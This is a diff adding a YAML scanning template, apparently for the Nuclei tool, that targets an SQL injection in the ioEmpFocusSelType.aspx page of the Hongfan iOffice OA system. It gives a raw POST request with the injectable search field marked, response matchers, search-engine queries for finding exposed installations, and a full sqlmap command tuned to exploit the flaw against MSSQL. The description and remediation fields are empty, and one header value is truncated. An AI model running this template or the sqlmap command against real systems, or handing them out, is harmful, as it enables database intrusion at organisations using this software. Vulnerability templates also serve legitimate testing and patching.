@@ -1,0 +1,35 @@
+id: hongfan-ioffice-ioEmpFocusSelType-sqli
+info:
+  name: hongfan ioffice ioEmpFocusSelType.aspx - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-hongfan-ioffice-ioEmpFocusSelType.aspx-sqli.yml
+  metadata:
+    verified: true
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    tips:
+    repair:
+    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql
+  tags: hongfan,sqli,oa,ioffce
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/ioCom/ioEmpFocusSelType.aspx HTTP/1.1
+        Host: {{Hostname}}
+        X-MicrosoftAjax: Delta=true
+        Content-Type: application/x-www-form-urlencoded; charset=utf-
+
+        ctl00%24scriptman%24ScriptManager1=ctl00%24cntForm%24upData%7Cctl00%24cntForm%24cmdSeach&ctl00%24cntForm%24txtSeach=*&ctl00%24cntButton%24txtTypeID=&__EVENTTARGET=ctl00%24cntForm%24cmdSeach&__ASYNCPOST=true&
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'ctl00_cntForm_upData')
+        condition: and
